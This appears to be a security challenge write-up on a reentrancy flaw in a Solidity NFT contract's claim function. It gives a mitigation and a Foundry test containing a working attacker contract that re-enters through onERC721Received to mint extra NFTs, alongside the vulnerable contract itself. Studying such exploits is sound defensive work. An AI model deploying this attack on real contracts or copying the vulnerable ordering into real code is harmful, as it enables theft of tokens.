## SafeNFT attack

The safeNFT is vulnerable to an reentrency attack in the claim function. The _safeMint() function is used before the canClaim state vriable is resettet.
The ERC721 standard checks on a transfer to an contract, if it implements the onERC721Received function and checks the return value.  
This can be used for the reentrence to claim another nft before the state varaible canClaim is resettet.

## Mitigation
Change the order in the claim() function to:
```solidity
canClaim[msg.sender] = false;
_safeMint(msg.sender, totalSupply()); 
```

or use a reentrence guard on that function. 

## Test
forge test --match-contract=SafeNFTTest

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract SafeNFTTest is Test {

    address owner = 0x0000000000000000000000000000000000000001;
    address attacker = 0x0000000000000000000000000000000000000003;

    safeNFT public nft;

    function setUp() public {
        vm.prank(owner);
        nft = new safeNFT("SafeNFT", "SNFT", 0.01 ether);
        
        vm.deal(attacker, 5 ether);
    }

    function testAttack() public {        
        
        // check that the attacker has 0 nft balance
        assertEq(nft.balanceOf(attacker), 0);

        // we deploy now our attacker
        vm.prank(attacker);
        AttackTheSafeNFT attckerContract = new AttackTheSafeNFT(address(nft));

        // get 5 nfts for only 0.01 ether
        vm.prank(attacker);
        attckerContract.drainSomeNft{value: 0.01 ether}();

        // attacker now have 5 nfts for only 0.01 ether
        assertEq(nft.balanceOf(attacker), 5);

        // we can do it one more time to have 10 in total for only 0.02 in sum
        vm.prank(attacker);
        attckerContract.drainSomeNft{value: 0.01 ether}();

        assertEq(nft.balanceOf(attacker), 10);
    }
}

contract AttackTheSafeNFT {

    uint256 nftsDrained = 0;
    address private immutable owner;
    safeNFT private immutable nft;

    constructor(address _nft) {
        owner = msg.sender;
        nft = safeNFT(_nft);
    }

    function drainSomeNft() external payable {
        // reset to 0, so we can drain as often as we want
        nftsDrained = 0;

        nft.buyNFT{value: msg.value}();

        nft.claim();
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes calldata) external returns(bytes4) {
        // move to owner if we havent drained 5
        if(nftsDrained < 5) {
            ++nftsDrained;
            nft.transferFrom(address(this), owner, _tokenId);
            nft.claim();
        }
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}


contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
 
}
```